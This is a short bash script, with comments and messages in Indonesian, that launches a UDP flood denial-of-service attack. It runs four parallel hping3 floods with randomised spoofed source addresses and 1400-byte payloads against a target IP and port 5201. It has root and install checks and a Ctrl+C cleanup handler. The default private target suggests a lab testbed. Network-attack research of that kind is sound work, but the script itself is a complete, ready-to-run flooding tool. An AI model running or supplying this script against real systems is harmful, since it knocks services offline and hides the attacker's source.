#!/bin/bash
# Serangan UDP Flood menggunakan hping3
# Jalankan dengan: sudo ./attack_udp.sh [TARGET_IP]

TARGET_IP="${1:-192.168.18.20}"

echo "=========================================="
echo "   UDP FLOOD ATTACK"
echo "=========================================="
echo "Target: $TARGET_IP"
echo "Mode: UDP flood ke port 5201 (iperf3)"
echo "Payload: 1400 bytes per packet"
echo "=========================================="
echo ""

# Cek apakah hping3 terinstal
if ! command -v hping3 &> /dev/null; then
    echo "ERROR: hping3 tidak terinstal!"
    echo "Install dengan: sudo apt install hping3"
    exit 1
fi

# Cek apakah script dijalankan dengan sudo
if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Script ini harus dijalankan dengan sudo"
    echo "Gunakan: sudo ./attack_udp.sh"
    exit 1
fi

echo "Memulai UDP flood... Tekan Ctrl+C untuk berhenti."
sleep 1

# LAUNCH 4 parallel hping3 to maximize throughput
for i in {1..4}; do
    hping3 --udp --flood --rand-source -p 5201 --data 1400 $TARGET_IP > /dev/null 2>&1 &
    PIDS+=($!)
done

# Trap CTRL+C for clean exit
trap "for pid in \${PIDS[@]}; do kill \$pid 2>/dev/null; done; echo; echo 'Serangan dihentikan.'; exit 0" INT

# Infinite loop to keep script alive
while true; do sleep 1; done
